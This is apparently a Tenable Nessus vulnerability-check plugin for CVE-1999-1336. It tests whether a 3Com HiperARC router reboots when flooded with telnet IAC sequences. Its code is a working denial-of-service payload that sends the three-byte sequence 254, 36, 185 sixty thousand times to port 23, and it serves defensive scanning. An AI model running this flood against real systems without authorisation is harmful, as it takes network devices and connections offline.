#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10108);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-1336");
 script_xref(name:"OSVDB", value:"6057");

 script_name(english:"3Com HiPer Access Router Card (HiperARC) IAC Packet Flood DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to reboot the remote host (likely a HyperARC router)
by sending it a high volume of IACs.

An attacker may use this flaw to shut down your internet connection." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=93492615408725&w=2" );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=93458364903256&w=2" );
 script_set_attribute(attribute:"solution", value:
"Add a telnet access list to your Hyperarc router. If the remote
system is not a Hyperarc router, then contact your vendor for a 
patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
 script_end_attributes();
 script_summary(english:"Crashes the remote host using the 'hyperbomb' attack");
 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_ports(23);
 script_require_keys("Settings/ParanoidReport"); 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

start_denial();
port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  data = raw_string(254, 36, 185);
  for(i=0;i<60000;i=i+1)
  {
   send(socket:soc, data:data, length:3);
  }
  close(soc);
 

 #
 # wait
 #
 sleep(5);

 alive = end_denial();
 if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_warning(0);
                }
 }
}
